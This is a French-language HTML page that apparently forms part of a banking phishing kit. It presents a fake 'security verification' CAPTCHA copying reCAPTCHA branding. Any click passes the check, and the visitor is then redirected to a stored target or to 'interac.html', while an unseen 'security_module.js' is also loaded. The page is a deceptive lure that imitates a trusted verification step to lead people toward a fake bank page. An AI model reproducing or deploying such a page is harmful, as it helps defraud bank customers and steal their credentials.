<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de sécurité</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f4f6f9; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #333; }
        .captcha-card { background: white; width: 90%; max-width: 380px; padding: 30px 24px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
        .icon-shield { width: 54px; height: 54px; background: #e8f0fe; color: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 26px; }
        h2 { font-size: 20px; font-weight: 700; margin: 0 0 8px; color: #1a1a1a; }
        p { font-size: 14px; color: #666; margin: 0 0 24px; line-height: 1.4; }
        
        .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 6px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .captcha-left { display: flex; align-items: center; gap: 12px; }
        .checkbox-custom { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 4px; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
        .checkbox-custom.checked { background: #1a73e8; border-color: #1a73e8; }
        .checkbox-custom.checked::after { content: "✓"; color: white; font-weight: bold; font-size: 16px; }
        .captcha-label { font-size: 14px; font-weight: 500; color: #444; cursor: pointer; user-select: none; }
        
        .recaptcha-logo { display: flex; flex-direction: column; align-items: center; font-size: 9px; color: #888; }
        .recaptcha-logo svg { width: 26px; height: 26px; fill: #1a73e8; margin-bottom: 2px; }

        .spinner { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .btn-continue { width: 100%; background: #1a73e8; color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; opacity: 0.6; pointer-events: none; transition: opacity 0.2s; }
        .btn-continue.active { opacity: 1; pointer-events: auto; }
    </style>
</head>
<body>

<div class="captcha-card">
    <div class="icon-shield">🛡️</div>
    <h2>Vérification de sécurité</h2>
    <p>Veuillez confirmer que vous n'êtes pas un robot pour continuer vers le service bancaire.</p>

    <div class="captcha-box">
        <div class="captcha-left">
            <div class="checkbox-custom" id="chkBox"></div>
            <div class="spinner" id="chkSpinner"></div>
            <span class="captcha-label" id="chkText">Je ne suis pas un robot</span>
        </div>
        <div class="recaptcha-logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
            <span>reCAPTCHA</span>
        </div>
    </div>

    <button class="btn-continue" id="btnGo">Continuer</button>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var chkBox = document.getElementById('chkBox');
        var spinner = document.getElementById('chkSpinner');
        var btnGo = document.getElementById('btnGo');

        chkBox.addEventListener('click', function() {
            chkBox.style.display = 'none';
            spinner.style.display = 'block';

            setTimeout(function() {
                spinner.style.display = 'none';
                chkBox.style.display = 'flex';
                chkBox.classList.add('checked');
                btnGo.classList.add('active');
            }, 1200);
        });

        btnGo.addEventListener('click', function() {
            var target = sessionStorage.getItem('__targetBank') || 'interac.html';
            window.location.href = target;
        });
    });
</script>
<script src="security_module.js"></script>
</body>
</html>
